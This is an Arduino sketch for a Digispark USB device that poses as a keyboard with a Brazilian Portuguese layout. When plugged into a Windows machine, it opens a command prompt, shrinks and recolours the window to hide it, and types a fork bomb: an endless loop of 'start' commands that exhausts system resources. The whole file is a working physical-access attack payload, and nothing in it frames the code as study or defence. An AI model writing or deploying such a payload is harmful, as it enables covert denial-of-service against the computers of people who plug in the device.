#include "DigiKeyboardPtBr.h"
void setup() {
}

void loop() {  
  digitalWrite(1, HIGH); // LED on <--> Action start
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("cmd");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  //Obfuscate the terminal
  DigiKeyboardPtBr.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print("COLOR EF");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  //Run the fork bomb
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print(F("for /l %x in (0,0,0) do start"));
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);  

  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*empty*/ }  
}
